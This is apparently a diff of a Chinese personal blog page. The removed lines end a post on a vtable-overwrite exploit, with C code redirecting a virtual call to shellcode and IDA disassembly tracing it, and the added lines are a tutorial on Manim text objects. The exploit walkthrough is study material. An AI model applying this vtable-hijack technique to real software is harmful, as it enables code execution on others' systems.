-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br></pre></td></tr></table></figure>
-<p>这就将该虚函数的地址修改为0x004088CC,这里恰好是shellcode的首地址(需要调试确定)</p>
-<p>然后p=&amp;overflow,p指针指向overflow对象</p>
-<p>通过指针调用对象的虚函数,需要去查虚函数表,应该调用哪一个函数,而虚函数表相应位置的函数地址已经被修改为shellcode的地址.</p>
-<p>p-&gt;test()本来应该是执行overflow的第一个也是唯一一个虚函数,但执行了shellcode</p>
-<h3 id="调试观察">调试观察</h3>
-<p>这个程序在win11,winXP,win2k上都可以弹窗,直接在win11上用ida分析</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:00401050 push    esi</span><br><span class="line">.text:00401051 push    edi</span><br><span class="line">.text:00401052 mov     edi, offset shellcode</span><br><span class="line">.text:00401057 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:0040105A xor     eax, eax</span><br><span class="line">.text:0040105C mov     byte ptr overflow_vtable, 0CCh</span><br><span class="line">.text:00401063 repne scasb</span><br><span class="line">.text:00401065 not     ecx</span><br><span class="line">.text:00401067 sub     edi, ecx</span><br><span class="line">.text:00401069 mov     byte ptr overflow_vtable+1, 88h</span><br><span class="line">.text:00401070 mov     eax, ecx</span><br><span class="line">.text:00401072 mov     esi, edi</span><br><span class="line">.text:00401074 mov     edi, offset overflow_buf</span><br><span class="line">.text:00401079 mov     byte ptr overflow_vtable+2, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00401080 shr     ecx, 2</span><br><span class="line">.text:00401083 mov     byte ptr overflow_vtable+3, 0</span><br><span class="line">.text:0040108A rep movsd</span><br><span class="line">.text:0040108C mov     ecx, eax</span><br><span class="line">.text:0040108E and     ecx, 3</span><br><span class="line">.text:00401091 rep movsb</span><br><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable</span><br><span class="line">.text:0040109E mov     p, ecx</span><br><span class="line">.text:004010A4 call    dword ptr [edx]</span><br><span class="line">.text:004010A6 pop     edi</span><br><span class="line">.text:004010A7 pop     esi</span><br><span class="line">.text:004010A8 retn</span><br><span class="line">.text:004010A8 _main endp</span><br></pre></td></tr></table></figure>
-<p>在<code>mov     byte ptr overflow_vtable, 0CCh</code>修改虚函数地址之前,看看此时overflow_vtable上放着的实际的虚函数地址是谁</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:00408818 overflow_vtable dd 4070C0h              ; DATA XREF: sub_401010↑w</span><br><span class="line">.data:00408818                                         ; _main+C↑w ...</span><br></pre></td></tr></table></figure>
-<p>该虚函数的实际地址是0x4070C0</p>
-<p>到这里看看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004070C0 off_4070C0 dd offset sub_401020         ; DATA XREF: sub_401010↑o</span><br></pre></td></tr></table></figure>
-<p>这里又是一个地址,去sub_401020看看</p>
-<p>thiscall调用约定中ecx用来传递this指针</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401020 sub_401020 proc near                    ; DATA XREF: .rdata:off_4070C0↓o</span><br><span class="line">.text:00401020 push    offset aClassVtableTes          ; &quot;Class Vtable::test()&quot;</span><br><span class="line">.text:00401025 mov     ecx, offset dword_4088F0        ; this</span><br><span class="line">.text:0040102A call    ??6ostream@@QAEAAV0@PBD@Z       ; ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040102F push    offset sub_4010D0</span><br><span class="line">.text:00401034 push    0Ah                             ; int</span><br><span class="line">.text:00401036 mov     ecx, eax                        ; this</span><br><span class="line">.text:00401038 call    ??6ostream@@QAEAAV0@E@Z         ; ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040103D mov     ecx, eax</span><br><span class="line">.text:0040103F call    sub_4010B0</span><br><span class="line">.text:00401044 retn</span><br><span class="line">.text:00401044 sub_401020 endp</span><br></pre></td></tr></table></figure>
-<p>虚函数地址修改完毕,shellcode也写入完毕了,此时要调用虚函数了,且看这里的汇编指令是啥样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable;设置this指针</span><br><span class="line">.text:0040109E mov     p, ecx;无意义</span><br><span class="line">.text:004010A4 call    dword ptr [edx];解引用,调用虚函数表的第一个函数</span><br></pre></td></tr></table></figure>
-<p>单步步入这个call就到了shellcode区域了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:0040881C overflow_buf:                           ; DATA XREF: _main+24↑o</span><br><span class="line">.data:0040881C cld</span><br><span class="line">.data:0040881D push    1E380A6Ah</span><br><span class="line">.data:00408822 push    4FD18963h</span><br><span class="line">.data:00408827 push    0C917432h</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/20/windows%E5%A0%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -4290,6 +4061,278 @@ alt="image-20220910231722908" />
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/09/Manim%20%E6%96%87%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/09/Manim%20%E6%96%87%E6%9C%AC/" class="post-title-link" itemprop="url">manim 文本</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-09 21:16:00 / Modified: 21:16:45" itemprop="dateCreated datePublished" datetime="2022-09-09T21:16:00+08:00">2022-09-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="manim-文本">Manim 文本</h1>
+<h2 id="markuptext">MarkupText</h2>
+<h2 id="text">Text</h2>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220907163441733.png"
+alt="image-20220907163441733" />
+<figcaption aria-hidden="true">image-20220907163441733</figcaption>
+</figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>text</td>
+<td>str对象，需要写入的字符串</td>
+</tr>
+<tr>
+<td>color</td>
+<td>str对象，文字的颜色，默认为WHITE</td>
+</tr>
+<tr>
+<td>font</td>
+<td>文字的字体</td>
+</tr>
+<tr>
+<td>font_size</td>
+<td>文字的大小，默认为48</td>
+</tr>
+<tr>
+<td>size</td>
+<td>文字的缩放比例，默认为1，表示原来的尺寸</td>
+</tr>
+<tr>
+<td>tab_width</td>
+<td>制表符tab的宽度，默认为4，表示4个空格的宽度</td>
+</tr>
+<tr>
+<td>slant</td>
+<td>设置斜体，默认为NORMAL。设为ITATIC表示文字设为斜体</td>
+</tr>
+<tr>
+<td>weight</td>
+<td>设置加粗，默认为NORMAL。设为BOLD表示文字加粗</td>
+</tr>
+<tr>
+<td>gradient</td>
+<td>可迭代对象，且元素为颜色，表示设置的渐变色的各个节点</td>
+</tr>
+<tr>
+<td>t2c</td>
+<td>字典Dict，子串到颜色的映射表</td>
+</tr>
+<tr>
+<td>t2g</td>
+<td>字典Dict，子串到渐变色节点迭代器的映射表</td>
+</tr>
+</tbody>
+</table>
+<p>Text类只接受一个字符串,不支持数学公式,不支持',换行可以用''</p>
+<h3 id="属性">属性</h3>
+<p>在构造函数上通过键值对的形式传递参数,修改属性</p>
+<h4 id="颜色相关">颜色相关</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, color=BLUE)</span><br><span class="line"></span><br><span class="line">text = Text(<span class="string">&#x27;Hello, world!&#x27;</span>, t2c=&#123;<span class="string">&#x27;world&#x27;</span>:BLUE&#125;)</span><br><span class="line"></span><br><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, gradient=(BLUE, GREEN,RED))<span class="comment">#颜色渐变,从左到右依次</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = Text(	<span class="comment">#精确模式</span></span><br><span class="line">    <span class="string">&#x27;Google&#x27;</span>, </span><br><span class="line">    t2c=&#123;</span><br><span class="line">        <span class="string">&#x27;[:1]&#x27;</span>:<span class="string">&#x27;#3174f0&#x27;</span>, <span class="string">&#x27;[1:2]&#x27;</span>:<span class="string">&#x27;#e53125&#x27;</span>, <span class="comment">#下标0到1之间使用蓝色,1到2之间使用红色...</span></span><br><span class="line">        <span class="string">&#x27;[2:3]&#x27;</span>:<span class="string">&#x27;#fbb003&#x27;</span>, <span class="string">&#x27;[3:4]&#x27;</span>:<span class="string">&#x27;#3174f0&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;[4:5]&#x27;</span>:<span class="string">&#x27;#269a43&#x27;</span>, <span class="string">&#x27;[5:]&#x27;</span>:<span class="string">&#x27;#e53125&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">        text = Text(	<span class="comment">#继承自Mobject的属性#就和调css差不多</span></span><br><span class="line">            <span class="string">&#x27;empire march!&#x27;</span>,</span><br><span class="line">            fill_color=RED,<span class="comment">#填充颜色</span></span><br><span class="line">            fill_opacity=<span class="number">0.5</span>,<span class="comment">#填充色的透明度</span></span><br><span class="line">            stroke_color=BLACK,<span class="comment">#边线颜色</span></span><br><span class="line">            stroke_width=<span class="number">2</span>,<span class="comment">#边线宽度</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+<h4 id="字体相关">字体相关</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, font=<span class="string">&#x27;Source Han Sans&#x27;</span>)<span class="comment">#修改整体字体</span></span><br><span class="line">text = Text(<span class="string">&#x27;Hello, world!&#x27;</span>, t2f=&#123;<span class="string">&#x27;world&#x27;</span>:<span class="string">&#x27;Forte&#x27;</span>&#125;)<span class="comment">#修改局部字体</span></span><br></pre></td></tr></table></figure>
+<h4 id="倾斜相关">倾斜相关</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, slant=ITALIC)<span class="comment">#整体倾斜,slant要么是ITALIC要么是NORMAL</span></span><br><span class="line">text = Text(<span class="string">&#x27;Hello, world!&#x27;</span>, t2s=&#123;<span class="string">&#x27;world&#x27;</span>:ITALIC&#125;)<span class="comment">#局部倾斜</span></span><br></pre></td></tr></table></figure>
+<h4 id="粗细相关">粗细相关</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, weight=BOLD)	<span class="comment">#整体加粗,weight=NORMAL/BOLD</span></span><br><span class="line">text = Text(<span class="string">&#x27;Hello, world!&#x27;</span>, t2w=&#123;<span class="string">&#x27;world&#x27;</span>:BOLD&#125;) <span class="comment">#局部加粗</span></span><br></pre></td></tr></table></figure>
+<h4 id="大小相关">大小相关</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello&#x27;</span>, size=<span class="number">5</span>)<span class="comment">#整体5号</span></span><br></pre></td></tr></table></figure>
+<h4 id="行间距">行间距</h4>
+<p>line_spacing_height,lsh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text = Text(<span class="string">&#x27;Hello\nWorld&#x27;</span>, lsh=<span class="number">1.5</span>)<span class="comment">#1.5倍行间距,使用\n换行时有效</span></span><br></pre></td></tr></table></figure>
+<h3 id="函数">函数</h3>
+<p>Text类对象实例化之后,作用于对象的成员函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>.play(FadeIn(text))</span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br><span class="line">text.set_color(RED)<span class="comment">#更改颜色</span></span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br><span class="line">text[<span class="number">1</span>:<span class="number">6</span>].set_color(BLUE)<span class="comment">#更改局部颜色</span></span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br><span class="line">text.set_color_by_gradient(RED,BLACK)<span class="comment">#更改渐变色</span></span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br><span class="line">text[<span class="number">4</span>:<span class="number">8</span>].set_color_by_gradient(WHITE,BLUE)<span class="comment">#更改局部渐变色</span></span><br><span class="line"><span class="variable language_">self</span>.wait()</span><br></pre></td></tr></table></figure>
+<h2 id="singlestringtex">SingleStringTex</h2>
+<p>manim中Tex的基类,主要用于渲染单行公式或者数学符号.</p>
+<p>也可以使用换行符//渲染多行公式</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tex_string</td>
+<td>str对象，表示输入的tex代码</td>
+</tr>
+<tr>
+<td>fill_opacity</td>
+<td>float，填充的透明度</td>
+</tr>
+<tr>
+<td>font_size</td>
+<td>字体大小，默认为48</td>
+</tr>
+<tr>
+<td>alignment</td>
+<td>str对象，对齐方式，默认为</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        tex=SingleStringTex(<span class="string">r&quot;f(x)=a_0+a_1x+a_2x^2+...+a_nx^n=\sum_&#123;i=0&#125;^n a_i x^i&quot;</span>)</span><br><span class="line">        tex.set_color(BLUE)</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(tex))</span><br></pre></td></tr></table></figure>
+<p>效果</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220909100945214.png"
+alt="image-20220909100945214" />
+<figcaption aria-hidden="true">image-20220909100945214</figcaption>
+</figure>
+<p>文字转换为公式的效果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> left</span><br><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        text=Text(<span class="string">&quot;Definition of the ellipse&quot;</span>)</span><br><span class="line">        tex2 = SingleStringTex(</span><br><span class="line">            tex_string=<span class="string">r&quot;\frac&#123;x^2&#125;&#123;a^2&#125;+\frac&#123;y^2&#125;&#123;b^2&#125;=1&quot;</span>,</span><br><span class="line">            font_size=<span class="number">80</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.add(text)</span><br><span class="line">        <span class="variable language_">self</span>.wait()</span><br><span class="line">        <span class="variable language_">self</span>.play(ReplacementTransform(text, tex2), run_time=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.wait()</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/Main4.gif"
+alt="Main4" />
+<figcaption aria-hidden="true">Main4</figcaption>
+</figure>
+<p>公式上色</p>
+<p>使用字典映射</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> left</span><br><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        color_dict=&#123;<span class="comment">#颜色字典</span></span><br><span class="line">            <span class="string">&quot;x&quot;</span>:RED,<span class="comment">#x字母都上色红色</span></span><br><span class="line">            <span class="string">&quot;f&quot;</span>:PINK,</span><br><span class="line">            <span class="string">&quot;a&quot;</span>:GREEN</span><br><span class="line">            &#125;</span><br><span class="line">        tex=Tex(</span><br><span class="line">            <span class="string">r&quot;f(x)=a_0+a_1x+a_2x^2+...+a_nx^n=\sum_&#123;i=0&#125;^n a_i x^i&quot;</span>,</span><br><span class="line">            font_size=<span class="number">60</span>,</span><br><span class="line">            tex_to_color_map=color_dict<span class="comment">#使用颜色字典</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.add(tex)</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(tex))</span><br><span class="line">        <span class="comment"># self.wait()</span></span><br></pre></td></tr></table></figure>
+<p>效果: <img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/Main5.gif"
+alt="Main5" /></p>
+<h2 id="tex">Tex</h2>
+<p>Tex是SingleStringTex的派生类,可以接收任意多个tex代码作为参数.</p>
+<p>如果想要使用多行公式,不如使用换行符<code>//</code>,在typora中编辑好了之后放到SingleStringTex中</p>
+<h2 id="textext">TexText</h2>
+<p>Tex的派生类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TexText</span>(<span class="title class_ inherited__">Tex</span>):</span><br><span class="line">    CONFIG = &#123;</span><br><span class="line">        <span class="string">&quot;math_mode&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;arg_separator&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>math_mode默认是false,此时的用法和typora中很像</p>
+<h2 id="bulletedlist">BulletedList</h2>
+<p>项目列表,TexText的子类</p>
+<p>用于产生条目</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> left, position</span><br><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">demo</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        text=Text(<span class="string">&quot;To-Do List&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.add(text)</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(text))</span><br><span class="line">        <span class="variable language_">self</span>.wait()</span><br><span class="line">        text2=text.copy()</span><br><span class="line">        text2.move_to(np.array([<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]))</span><br><span class="line">        <span class="variable language_">self</span>.play(ReplacementTransform(text,text2))<span class="comment">#产生移动效果</span></span><br><span class="line">        tex=BulletedList(<span class="comment">#项目列表</span></span><br><span class="line">            <span class="string">&quot;win32 WinMine&quot;</span>,</span><br><span class="line">            <span class="string">&quot;win32 notepad&quot;</span>,</span><br><span class="line">            <span class="string">&quot;x86 assembly&quot;</span>,</span><br><span class="line">            <span class="string">&quot;linux kernel 0.12&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.add(tex)</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(tex))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>效果</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/Main6.gif"
+alt="Main6" />
+<figcaption aria-hidden="true">Main6</figcaption>
+</figure>
+<h2 id="title">Title</h2>
+<table>
+<colgroup>
+<col style="width: 32%" />
+<col style="width: 67%" />
+</colgroup>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>scale_factor</td>
+<td>float或者int，缩放比例，用来控制标题大小。默认值为1，表示不做缩放</td>
+</tr>
+<tr>
+<td>include_underline</td>
+<td>bool，表示标题是否需要下划线，默认为True</td>
+</tr>
+<tr>
+<td>underline_width</td>
+<td>float或者int，表示标题下下划线的宽度，默认为屏幕宽度减去2</td>
+</tr>
+<tr>
+<td>match_underline_width_to_text</td>
+<td>bool，表示是否需要让下划线宽度适应于标题的宽度，默认为False</td>
+</tr>
+<tr>
+<td>underline_buff</td>
+<td>float，下划线的厚度，默认为MED_SMALL_BUFF（也就是0.25）</td>
+</tr>
+</tbody>
+</table>
+<p>数学公式渲染的标题,好处就是自动定在比较靠上的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> left, position</span><br><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        title=Title(</span><br><span class="line">            <span class="string">r&quot;TODO List&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(title))</span><br><span class="line">        tex=BulletedList(<span class="comment">#项目列表</span></span><br><span class="line">            <span class="string">&quot;win32 WinMine&quot;</span>,</span><br><span class="line">            <span class="string">&quot;win32 notepad&quot;</span>,</span><br><span class="line">            <span class="string">&quot;x86 assembly&quot;</span>,</span><br><span class="line">            <span class="string">&quot;linux kernel 0.12&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.add(tex)</span><br><span class="line">        <span class="variable language_">self</span>.play(Write(tex))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220909105811995.png"
+alt="image-20220909105811995" />
+<figcaption aria-hidden="true">image-20220909105811995</figcaption>
+</figure>
+<p>如果设置tex支持中文,则渲染效果是很好的,但是所有数学公式的渲染都需要花费时间,这是tex相对于text的最大缺点</p>
+<h2 id="bracelabel">BraceLabel</h2>
+<p>SingleStringTex的派生类,增强的Brace,可以在花括号上写字了</p>
+<p>用于标注形体长度等等</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">       circle=Circle()</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(circle))</span><br><span class="line">       bl=BraceLabel(</span><br><span class="line">            circle,</span><br><span class="line">            text=<span class="string">&quot;d=10&quot;</span>,</span><br><span class="line">            brace_direction=UP</span><br><span class="line">       )</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(bl))</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220909110914772.png"
+alt="image-20220909110914772" />
+<figcaption aria-hidden="true">image-20220909110914772</figcaption>
+</figure>
+<h2 id="bracetext">BraceText</h2>
+<p>类似BraceLabel,但是允许<code>$行内公式$</code></p>
